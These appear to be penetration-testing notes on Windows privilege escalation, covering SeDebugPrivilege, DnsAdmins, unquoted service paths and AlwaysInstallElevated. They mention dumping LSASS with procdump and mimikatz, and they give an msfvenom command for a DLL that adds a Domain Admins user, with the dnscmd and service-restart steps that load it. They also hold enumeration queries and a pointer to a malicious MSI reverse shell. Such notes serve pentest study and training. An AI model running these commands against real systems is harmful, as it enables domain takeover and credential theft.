      SeDebugPrivilege

        This policy setting determines which users can attach to or open any process, even a process they do not own. This user right provides access to sensitive and critical operating system components.

        This permission allow us to lssas process memory. There are several ways to do so. We can do it using procdump from sysinternals and then load it to mimikatz

      DnsAdmins

        Members of the DnsAdmins group have access to DNS information on the network. Since windows DNS service supports custom plugins and call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones this service is vulnerable to privilege escalation or information leakage

        The DNS service runs as NT AUTHORITY\SYSTEM. The steps to escalate are the following

        Generate a malicious DLL and transfer it to the victim machine

        msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

        Load DLL as memeber of DnsAdmins. We can check if are inside this group by using Get-ADGroupMember -Identity DnsAdmins

        dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

        Now, in order to trigger that .dll the DNS service must be restarted since the plugin will be loaded in the next start. Just by being in the DnsAdmins group does not grant us from having the privilege to restart the DNS service we can check it using

        I recommend you to perform all the following actions from CMD. Powershell does not work 
        wmic useraccount where name="netadm" get sid #View your SID
sc.exe sdshow DNS

        The output will be similar to this one, where the first A equals to Allow and RPWP are the permissions to stop and start the DNS service

        (A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
A: Allow

        Stoping and starting the DNS service

        sc stop dns
sc start dns

        Unquoted Service path

          When ever a windows service installs it saves the path in the Windows register. The problem appears when this path is saves without quotes

          "C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe"  ✅ (Right)
 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe    ⚠️ (vulnerable)

          In those cases where quotes are not implace windows interprets paths in a strange way. It attempts to execute the binary trying the differents paths provided. Here is an example have as a base the previous unquoted path

          C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

          In case we would be able to write a file in any of this rotes with the specified name we could be able to perform a hijack

          Now let's search for those services with unquoted path. Use the following query

          wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

      Always Install elevated

        This setting can be set via Local Group Policy by setting and allows that always every installed msi or exe will be installed as SYSTEM user. We can check it performing

        reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        In that case this is enabled we could generate a malicious msi and then excute it in order to capture a reverse shell
